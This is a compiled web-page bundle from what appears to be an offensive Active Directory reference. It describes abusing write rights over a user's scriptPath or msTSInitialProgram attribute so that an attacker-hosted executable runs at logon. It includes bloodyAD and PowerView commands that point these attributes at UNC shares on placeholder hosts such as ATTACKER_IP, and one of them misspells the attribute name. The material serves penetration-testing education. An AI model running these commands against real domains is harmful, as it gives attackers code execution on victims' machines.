import{_ as n,c as r,a5 as F,G as a,w as e,B as l,o,j as i,a as s}from"./chunks/framework.B5CpDqM0.js";const u=JSON.parse('{"title":"Logon script","description":"","frontmatter":{"authors":"CravateRouge, ShutdownRepo"},"headers":[],"relativePath":"ad/movement/dacl/logon-script.md","filePath":"ad/movement/dacl/logon-script.md","lastUpdated":1724982529000}'),d={name:"ad/movement/dacl/logon-script.md"};function p(g,t,c,C,E,y){const h=l("PluginTabsTab"),k=l("PluginTabs");return o(),r("div",null,[t[2]||(t[2]=F('<h1 id="logon-script" tabindex="-1">Logon script <a class="header-anchor" href="#logon-script" aria-label="Permalink to &quot;Logon script&quot;">​</a></h1><div class="note custom-block"><p>It is worth noting that during lab testing, I couldn&#39;t find a way to practice this scenario. Since I didn&#39;t find practical enough resources on the Internet, feel free to reach out if you manage to exploit this.</p></div><p>This abuse can be carried out when controlling an object that has a <code>GenericAll</code> or <code>GenericWrite</code> over the target, or a <code>WriteProperty</code> premission over the target&#39;s logon script attribute (i.e. <code>scriptPath</code> or <code>msTSInitialProgram</code>).</p><p>The attacker can make the user execute a custom script at logon.</p>',4)),a(k,null,{default:e(()=>[a(h,{label:"UNIX-like"},{default:e(()=>t[0]||(t[0]=[i("p",null,[s("This can be achieved with "),i("a",{href:"https://github.com/CravateRouge/bloodyAD",target:"_blank",rel:"noreferrer"},"bloodyAD"),s(".")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"bloodyAD"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --host"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_IP"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -d"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," set"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," object"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," vulnerable_user"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," msTSInitialProgram"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -v"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '\\\\1.2.3.4\\share\\file.exe'")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"bloodyAD"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --host"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_IP"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -d"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," set"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," object"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," vulnerable_user"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," msTSWorkDirectory"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -v"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'C:\\'")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# or")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"bloodyAD"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --host"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_IP"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -d"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," set"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," object"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," vulnerable_user"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," scriptPath"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -v"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '\\\\1.2.3.4\\share\\file.exe'")])])])],-1)])),_:1}),a(h,{label:"Windows"},{default:e(()=>t[1]||(t[1]=[i("p",null,[s("This can be achieved with "),i("a",{href:"https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/",target:"_blank",rel:"noreferrer"},"Set-DomainObject"),s(" ("),i("a",{href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",target:"_blank",rel:"noreferrer"},"PowerView"),s(" module).")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Set-DomainObject"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," testuser"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Set"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," @{'msTSTnitialProgram'='\\\\ATTACKER_IP\\share\\run_at_logon.exe'}"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Verbose")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Set-DomainObject"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," testuser"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Set"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," @{'scriptPath'='\\\\ATTACKER_IP\\share\\run_at_logon.exe'}"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Verbose")])])])],-1)])),_:1})]),_:1})])}const b=n(d,[["render",p]]);export{u as __pageData,b as default};